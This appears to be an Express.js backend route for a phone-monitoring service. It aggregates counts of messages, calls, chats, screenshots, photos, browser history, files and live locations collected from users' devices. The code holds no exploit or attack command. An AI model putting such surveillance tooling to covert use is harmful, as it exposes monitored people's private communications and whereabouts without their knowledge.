const router = require('express').Router();
const { supabase } = require('../config/supabase');
const { auth } = require('../middleware/auth');

// Get aggregated dashboard for all devices
router.get('/', auth, async (req, res) => {
  try {
    const { data: devices, error: devErr } = await supabase
      .from('devices')
      .select('*')
      .eq('user_id', req.userId)
      .order('created_at', { ascending: false });
    if (devErr) throw devErr;

    if (!devices || devices.length === 0) {
      return res.json({ devices: [], totals: {}, recentAlerts: [], liveLocations: [] });
    }

    const deviceIds = devices.map(d => d.device_id);

    const [smsCount, mmsCount, callsCount, appCount, contactCount, chatCount, pictureCount, screenshotCount, browserCount, calendarCount, locationCount, fileCount, geofenceCount, smsCmdCount, simCount, alertsResult, screenTime] = await Promise.all([
      supabase.from('sms_messages').select('id', { count: 'exact', head: true }).in('device_id', deviceIds),
      supabase.from('mms_messages').select('id', { count: 'exact', head: true }).in('device_id', deviceIds),
      supabase.from('call_logs').select('id', { count: 'exact', head: true }).in('device_id', deviceIds),
      supabase.from('installed_apps').select('id', { count: 'exact', head: true }).in('device_id', deviceIds),
      supabase.from('contacts').select('id', { count: 'exact', head: true }).in('device_id', deviceIds),
      supabase.from('chat_messages').select('id', { count: 'exact', head: true }).in('device_id', deviceIds),
      supabase.from('pictures').select('id', { count: 'exact', head: true }).in('device_id', deviceIds),
      supabase.from('screenshots').select('id', { count: 'exact', head: true }).in('device_id', deviceIds),
      supabase.from('browser_history').select('id', { count: 'exact', head: true }).in('device_id', deviceIds),
      supabase.from('calendar_events').select('id', { count: 'exact', head: true }).in('device_id', deviceIds),
      supabase.from('locations').select('id', { count: 'exact', head: true }).in('device_id', deviceIds),
      supabase.from('device_files').select('id', { count: 'exact', head: true }).in('device_id', deviceIds),
      supabase.from('geofence_zones').select('id', { count: 'exact', head: true }).in('device_id', deviceIds),
      supabase.from('sms_commands').select('id', { count: 'exact', head: true }).in('device_id', deviceIds),
      supabase.from('sim_info').select('id', { count: 'exact', head: true }).in('device_id', deviceIds),
      supabase.from('alerts').select('*').in('device_id', deviceIds).eq('is_read', false).order('created_at', { ascending: false }).limit(20),
      supabase.from('screen_time_stats').select('total_minutes').in('device_id', deviceIds).eq('summary_date', new Date().toISOString().split('T')[0])
    ]);

    const totals = {
      sms: smsCount.count || 0, mms: mmsCount.count || 0, calls: callsCount.count || 0,
      apps: appCount.count || 0, contacts: contactCount.count || 0, chatMessages: chatCount.count || 0,
      pictures: pictureCount.count || 0, screenshots: screenshotCount.count || 0,
      browserHistory: browserCount.count || 0, calendarEvents: calendarCount.count || 0,
      locations: locationCount.count || 0, files: fileCount.count || 0,
      geofenceZones: geofenceCount.count || 0, smsCommands: smsCmdCount.count || 0,
      simCards: simCount.count || 0,
      screenTimeToday: (screenTime.data || []).reduce((sum, r) => sum + (r.total_minutes || 0), 0)
    };

    const liveLocations = devices.filter(d => d.latitude && d.longitude).map(d => ({
      deviceId: d.id, deviceName: d.device_name, latitude: d.latitude, longitude: d.longitude,
      battery: d.battery_level, isOnline: d.is_online, lastSeen: d.location_updated_at
    }));

    res.json({ devices, totals, recentAlerts: alertsResult.data || [], liveLocations });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// Get device-specific dashboard
router.get('/:deviceId', auth, async (req, res) => {
  try {
    const deviceId = req.params.deviceId;
    const { data: device, error: devErr } = await supabase.from('devices').select('*').eq('device_id', deviceId).eq('user_id', req.userId).single();
    if (devErr || !device) return res.status(404).json({ error: 'Device not found' });

    const [sms, mms, calls, apps, contacts, chat, pictures, screenshots, browser, calendar, locations, files, geofence, smsCmd, sim, alerts, screenTime] = await Promise.all([
      supabase.from('sms_messages').select('id', { count: 'exact', head: true }).eq('device_id', deviceId),
      supabase.from('mms_messages').select('id', { count: 'exact', head: true }).eq('device_id', deviceId),
      supabase.from('call_logs').select('id', { count: 'exact', head: true }).eq('device_id', deviceId),
      supabase.from('installed_apps').select('id', { count: 'exact', head: true }).eq('device_id', deviceId),
      supabase.from('contacts').select('id', { count: 'exact', head: true }).eq('device_id', deviceId),
      supabase.from('chat_messages').select('id', { count: 'exact', head: true }).eq('device_id', deviceId),
      supabase.from('pictures').select('id', { count: 'exact', head: true }).eq('device_id', deviceId),
      supabase.from('screenshots').select('id', { count: 'exact', head: true }).eq('device_id', deviceId),
      supabase.from('browser_history').select('id', { count: 'exact', head: true }).eq('device_id', deviceId),
      supabase.from('calendar_events').select('id', { count: 'exact', head: true }).eq('device_id', deviceId),
      supabase.from('locations').select('id', { count: 'exact', head: true }).eq('device_id', deviceId),
      supabase.from('device_files').select('id', { count: 'exact', head: true }).eq('device_id', deviceId),
      supabase.from('geofence_zones').select('id', { count: 'exact', head: true }).eq('device_id', deviceId),
      supabase.from('sms_commands').select('id', { count: 'exact', head: true }).eq('device_id', deviceId),
      supabase.from('sim_info').select('id', { count: 'exact', head: true }).eq('device_id', deviceId),
      supabase.from('alerts').select('*').eq('device_id', deviceId).eq('is_read', false).order('created_at', { ascending: false }).limit(20),
      supabase.from('screen_time_stats').select('total_minutes').eq('device_id', deviceId).eq('summary_date', new Date().toISOString().split('T')[0])
    ]);

    res.json({
      device,
      counts: {
        sms: sms.count || 0, mms: mms.count || 0, calls: calls.count || 0,
        apps: apps.count || 0, contacts: contacts.count || 0, chatMessages: chat.count || 0,
        pictures: pictures.count || 0, screenshots: screenshots.count || 0,
        browserHistory: browser.count || 0, calendarEvents: calendar.count || 0,
        locations: locations.count || 0, files: files.count || 0,
        geofenceZones: geofence.count || 0, smsCommands: smsCmd.count || 0,
        simCards: sim.count || 0,
        screenTimeToday: (screenTime.data || []).reduce((sum, r) => sum + (r.total_minutes || 0), 0)
      },
      unreadAlerts: alerts.data || []
    });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

module.exports = router;
